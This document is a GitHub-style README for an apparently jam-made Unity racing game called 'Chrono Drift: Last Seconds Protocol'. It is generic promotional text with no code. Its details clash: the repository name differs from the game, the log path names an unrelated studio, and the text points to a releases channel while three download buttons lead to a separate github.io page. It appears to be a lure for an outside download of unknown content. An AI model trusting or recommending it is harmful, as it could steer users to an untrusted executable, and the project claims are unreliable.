![preview](https://raw.githubusercontent.com/emanmohiuddin2005-ops/pulse-countdown-arena/main/splash_a3c8c3.svg)

# Chrono Drift: Last Seconds Protocol ⏱️

![Project Status](https://img.shields.io/badge/status-early_access-2ea44f)
![Engine](https://img.shields.io/badge/engine-Unity_2026-8A2BE2)
![License](https://img.shields.io/badge/license-MIT-yellow)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)

## What Is This? 🕹️

**Chrono Drift: Last Seconds Protocol** is a high-velocity, top-down survival racer where every tick of the clock is a weapon, a shield, and your only currency. Conceived from the raw energy of the GMTK 2026 Game Jam and its *COUNTDOWN* theme, this project bends the typical racing formula into a reverse-race against entropy itself.

You aren't racing to the finish line—you are racing *from* the inevitable reset. Each second you shave off your personal best grants you a "Chrono Shard" to extend the global timer that holds your universe together. The catch? Your own exhaust trail dissolves the floor behind you, while enemies emerge from the fading timeline to drag you back into the static.

This is not a game about speed. This is a game about *staying ahead of the future that's collapsing into the past*. It's a meditative panic, a strategic scramble where every narrow dodge is a negotiation with destiny. Built with a custom entity-component system in Unity, this repository is a complete, extensible foundation for anyone interested in time-manipulation mechanics, procedural arena generation, or just making something tense and beautiful.

---

## Table of Contents 🗂️

- [Why "Last Seconds Protocol"?](#why-last-seconds-protocol)
- [Core Mechanics Overview](#core-mechanics-overview)
- [Key Features](#key-features)
- [The Chrono-System Architecture 🧠](#the-chrono-system-architecture)
- [Visual & Audio Design](#visual--audio-design)
- [Getting Started](#getting-started)
- [Project Structure](#project-structure)
- [Contributing](#contributing)
- [Roadmap for 2026 & Beyond](#roadmap-for-2026--beyond)
- [Localization & Multilingual Support](#localization--multilingual-support)
- [Accessibility & Responsive UI](#accessibility--responsive-ui)
- [Telemetry & Player Feedback Loop](#telemetry--player-feedback-loop)
- [Support & Community](#support--community)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Why "Last Seconds Protocol"? 🤔

The name isn't a marketing hook; it's the literal rulebook. The game world operates on a ticking central vault timer visible at all times. When it hits zero, the entire arena performs a "hard reboot," resetting your collected shards, your position, and the layout of obstacles. This isn't a game over screen—it's a new beginning disguised as failure, encouraging speedrunners to chase *cycles* rather than single-run perfection.

The metaphor is simple: you are the final breath of a dying universe, and each shard you collect is a second you steal from the void to give back to your world. The gameplay loop reflects this—every run is a countdown within a countdown, a recursive spiral of urgency that keeps the adrenaline spikes high.

---

## Core Mechanics Overview ⚙️

Here's where the traditional racer gets a wrecking ball to expectations:

1. **Time-Trail Erosion**: Your ship leaves a semi-transparent "temporal wake." Any wall, enemy, or hazard you pass through this wake gets *erased* from the current timeline for 3 seconds. You can carve shortcuts through solid geometry, but you'll also erase your own escape routes.

2. **Chrono Shard Harvesting**: The only way to increase the central vault timer is to drive near "Temporal Wells"—floating, pulsing spheres that spawn at random points. However, collecting a shard increases your ship's *mass*, making you slower and less maneuverable. A true risk/reward tightrope walk.

3. **Reverse Shockwave**: When the global timer drops below 10 seconds, the arena edges start closing in with a visual distortion effect. You must use your time-erasing wake to literally etch a path through the encroaching walls to survive the final seconds.

4. **Enemy Type: Ripplers**: These are not battling drones. They are echoes of your previous run that drift toward the position you were at *one second ago*. Outrunning yourself is the only defense, turning every loop into a dance with your own ghost.

---

## Key Features ✨

- **Pure Chaos Stability**: A deterministic physics tick system ensures that identical inputs yield identical results, crucial for competitive time-attack challenges.
- **Modular Time Vault**: The central countdown is not hardcoded; it's a scriptable object, allowing designers to create custom game modes (e.g., "Marathon Clock," "Sudden Death Cycle").
- **Procedural Arena Generation**: No two runs are alike. The floor patterns, well spawns, and erosion-starting points use a seeded randomizer based on the current date and time.
- **Dynamic Difficulty "Dust"**: Instead of traditional difficulty levels, the game adjusts the density of Ripplers and the speed of the vault drain based on your recent performance. The better you do, the faster the dust settles.
- **Minimal HUD Philosophy**: All vital info (timer, shard count, mass) is diegetic—projected directly onto the floor beneath your ship. No cluttered corners.
- **Full Gamepad & Keyboard Support**: Precision controls with a focus on low-latency input, essential for those 0.1-second shave-offs.
- **Replay System**: A built-in ghost replay that records your last successful cycle, allowing you to race against "Past You" in a bid to break the loop.

---

## The Chrono-System Architecture 🧠

At the heart of this project lies the **ChronoSync** core, a custom utility that handles all temporal state changes without causing mass memory leaks or synchronization issues across multiple entities.

- **TemporalTransform**: A component that remembers the last N frames of position and rotation for every object. This is memory-efficient due to a ring buffer structure, capped at 360 frames (6 seconds at 60fps).
- **Event Scheduler**: A priority queue that fires timeline events (erasure, shard collection, vault warnings) with frame-perfect accuracy.
- **Deterministic RNG**: We use a seeded `System.Random` with manual seeding via the session start timestamp, ensuring that the "Random" arena generation is reproducible for bug reports.

This architecture is deliberately over-engineered for a jam game to show how scalable time-manipulation mechanics can be implemented cleanly.

---

## Visual & Audio Design 🎨

- **Palette**: Inspired by retro-futurism, we use a "VHS Heat" palette—teal shadows, magenta neon paths, and a burning orange for the fatal timer. High contrast helps readability at high speed.
- **Visual Feedback**: Every action causes a screen-space ripple (not just a camera shake). Going through your own wake triggers a chromatic aberration effect, signaling the timeline divergence.
- **Audio**: The soundtrack is procedural and adaptive. The tempo directly corresponds to the remaining seconds on the vault clock. The lower the clock, the more percussion layers are added. The sound of a shard being collected is a rising bell tone that mimics a "reverse heartbeat."
- **The "Silence" Effect**: For 0.5 seconds after the vault resets, all audio fades to near-silence except for a low hum, emphasizing the "rebirth" feeling before chaos re-engages.

---

## Getting Started 🚀

[![Download](https://raw.githubusercontent.com/emanmohiuddin2005-ops/pulse-countdown-arena/main/btn_06a537.svg)](https://emanmohiuddin2005-ops.github.io/pulse-countdown-arena/)

To get your hands on the latest build, you'll want to grab the compiled executable from the releases channel. This is a Unity 2026 LTS project, so if you're a developer looking to jump into the source, you'll need a compatible Editor version to open the `ChronoDrift` folder directly.

**Prerequisites**:
- A 64-bit operating system (Windows 10/11, macOS 12+, or major Linux distributions).
- At least 4GB of RAM.
- A graphics card that supports Shader Model 5.0.

**Running the Game**:
1. Download the archive matching your OS from the [![Download](https://raw.githubusercontent.com/emanmohiuddin2005-ops/pulse-countdown-arena/main/btn_06a537.svg)](https://emanmohiuddin2005-ops.github.io/pulse-countdown-arena/) section highlighted above.
2. Extract the archive to a folder of your choice.
3. Run the executable named `ChronoDrift.exe` (Windows) or `ChronoDrift.app` (macOS).
4. The game will launch in a windowed mode by default. Press `F11` to toggle fullscreen.

**For Developers**:
If you wish to tinker with the source, you'll need to install the Unity Hub and add the Unity 2026.1.0f1 Editor. Once opened, let the package manager restore the required dependencies (the `com.chronosync` package is bundled locally within the project). You can find the main scene under `Assets/Scenes/MainArena.unity`.

---

## Project Structure 📁

Here's how the repository is organized for contributors:

- `Assets/`
  - `_Scripts/`
    - `Core/` – Contains the ChronoSync, Event Scheduler, and Global Timer scripts.
    - `Entities/` – PlayerController, RipplerAI, and CollectibleWell.
    - `UI/` – The diegetic HUD projections and menu flow.
    - `Procedural/` – The ArenaGenerator and SeededRandom.
  - `Scenes/` – The main game scene and a test scene for benchmarking.
  - `Prefabs/` – The player ship, enemies, and effects.
  - `Art/` – Sprites, Materials, and Shaders (all in-house, no third-party assets).
- `Packages/` – The manifest file linking to `com.chronosync`.
- `ProjectSettings/` – Unity project configuration, including the Input Manager bindings.
- `Docs/` – Design documents and the original jam submission pitch.

---

## Contributing 🤝

We welcome contributors of all skill levels. Whether you're a 3D artist, a sound designer, or a gameplay logic wizard, there's a place for you.

Please follow these guidelines:

1. **Fork the Repository** and create a feature branch.
2. **Code Style**: We use trailing commas and descriptive variable names. Follow the existing style in `Assets/_Scripts/Core`.
3. **Testing**: Run the `Tests` suite in the Test Runner before submitting a pull request. Ensure the `ChronoSync` tests pass.
4. **Issue Tracking**: Use the GitHub Issues tab to report bugs, but search first! The odds are someone else already reported the exact *Rippler Stuck in Wall* glitch.

**Feature Proposals**: If you have a wild idea (like a "Time Shield" or "Rewind Bomb"), post it in the Discussions tab under the "Gameplay Ideas" category.

---

## Roadmap for 2026 & Beyond 🗓️

The jam is just the beginning. We have a curated list of features for the full release later in 2026:

- **Week 1 (Post-Jam Cleanup)**: Bug fixes derived from community feedback, performance pass for low-end hardware.
- **Month 1**: Add more enemy types (e.g., "Paradox Dragger" which inverts your controls briefly) and a level editor.
- **Month 3**: Implement the "Ghost Gauntlet" mode—a sandbox where you race against edited replays of world-record holders.
- **Month 6**: Potential multiplayer co-op mode where two players drive the same ship, one controls steering, the other controls the time-erasing ability.

---

## Localization & Multilingual Support 🌍

We believe speed has no language barrier, but that shouldn't stop us from making the menu accessible. Currently, we support:

- **English** (primary tuning language).
- **Japanese** (the de facto language of time-travel fiction).
- **Spanish** (for the biggest racing community space).

We use Unity's Localization package with String Tables. Translation contributions are managed through the `Docs/Localization/` folder. If you see a wrong grammar structure or a more idiomatic phrasing, submit a PR with the corrected spreadsheets—we'll manually review each one.

---

## Accessibility & Responsive UI 🖥️

We take "responsive" seriously. The UI is not just visually scalable; it's functionally robust to different input methods.

- **Scalable Text**: The HUD projections use a dynamic font size algorithm that adjusts based on the current resolution, ensuring the timer is always legible.
- **Colorblind Modes**: A built-in filter (in Options > Display) shifts the palette from *Teal/Magenta/Orange* to *Blue/Yellow/Red* variants without losing the urgency cues.
- **Controller Rebinding**: Full remapping is available in the settings. You can map the "Erode" action to a different button than the default (which is `Left Trigger` on gamepad and `Shift` on keyboard).
- **Training Wheels Mode**: A slower version of the clock (drains at 50% speed) for players who want to learn the flow without the panic. This is slightly slower, but it's not a "happy" mode—it still makes you respect the countdown.

---

## Telemetry & Player Feedback Loop 📊

To improve the game, we rely on a session-based anonymous telemetry (only stored locally, never sent to a server without explicit opt-in). We track:

- **Time-to-Collect** metrics for shards.
- **Thermal Throttling Events** (times you nearly caught the wall).
- **Control Clash Reports** (where you hit the wall despite turning early).

This data helps us balance the "Dust Adjustment" algorithm, ensuring the game remains tense for veterans but is not impossible for newcomers. You can delete the `telemetry.json` file in the root folder at any time to reset the local data.

---

## Support & Community 💬

Encounter a game-breaking glitch? Stuck on a particularly cruel procedural map? We're here to help, 24/7 (because the countdown never sleeps).

- **Discord Server**: The hub for community challenges, weekly "Chrono Race" events, and developer Q&A.
- **GitHub Discussions**: For longer-form debates about mechanics, meta-game balance, and feature requests.
- **Email Support**: For critical bugs or security issues, reach out via the repository's contact email (found in the LICENSE file).

We aim to respond to all support tickets within 24 hours. For the most efficient help, please include your `player.log` file (located in `%APPDATA%/../LocalLow/HoleInOneGolfer/ChronoDrift/player.log` on Windows, and similar paths on other OS).

---

## Disclaimer ⚠️

This project is a creative work made for the 2026 GMTK Game Jam. It is not affiliated with, endorsed by, or sponsored by Game Maker's Toolkit, Mark Brown, or any associated parties. "Unity" is a trademark of Unity Technologies. The use of the term "GMTK" is purely for descriptive purposes of the source jam event.

The game contains flashing lights and rapid motion that may cause discomfort for photosensitive individuals. Please refer to the in-game health guide for details.

**No Warranty**: This software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability.

---

## License 📄

This project is licensed under the MIT License. You are free to use, modify, and distribute this codebase for any purpose, commercial or otherwise, provided you include the original copyright notice in any substantial portions of the software. See the [LICENSE](LICENSE) file for the full text, or visit the official page at [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

---

[![Download](https://raw.githubusercontent.com/emanmohiuddin2005-ops/pulse-countdown-arena/main/btn_06a537.svg)](https://emanmohiuddin2005-ops.github.io/pulse-countdown-arena/)